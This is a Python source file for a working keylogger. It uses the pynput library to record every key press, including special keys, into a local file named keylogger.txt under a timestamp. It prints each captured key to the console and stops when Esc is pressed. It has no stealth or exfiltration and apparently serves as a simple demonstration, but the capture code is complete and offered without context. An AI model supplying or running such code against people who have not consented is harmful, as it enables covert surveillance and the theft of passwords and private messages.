from pynput.keyboard import Key, Listener
from datetime import datetime
import time
import os

print("Logging to:", os.path.abspath("keylogger.txt"))

last_key = None
last_time = 0
DEBOUNCE_DELAY = 0.0

def write_file(key):
    global last_key, last_time

    current_time = time.time()
    output = ''

    try:
        if hasattr(key, 'char') and key.char is not None:
            if key.char == last_key and (current_time - last_time) < DEBOUNCE_DELAY:
                return  
            output = key.char
            last_key = key.char
            last_time = current_time

        elif key == Key.space:
            output = ' '
        elif key == Key.enter:
            output = '\n'
        elif key == Key.tab:
            output = '\t'
        elif key == Key.backspace:
            output = '[BKSP]'
        elif key in (Key.shift, Key.shift_r):
            return
        elif key == Key.esc:
            output = '\n[Session Ended]\n'
        else:
            output = f'[{key.name}]'

        with open("keylogger.txt", "a", encoding='utf-8') as f:
            f.write(output)
        print(f"Logged: {output}")

    except Exception as e:
        print("Error:", e)

def on_press(key):
    write_file(key)

def on_release(key):
    if key == Key.esc:
        return False

if __name__ == "__main__":
    with open("keylogger.txt", "a", encoding='utf-8') as f:
        f.write(f"\n\nTimeStamp: {str(datetime.now())[:-7]}\n")
        f.write("-" * 60 + "\n")

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
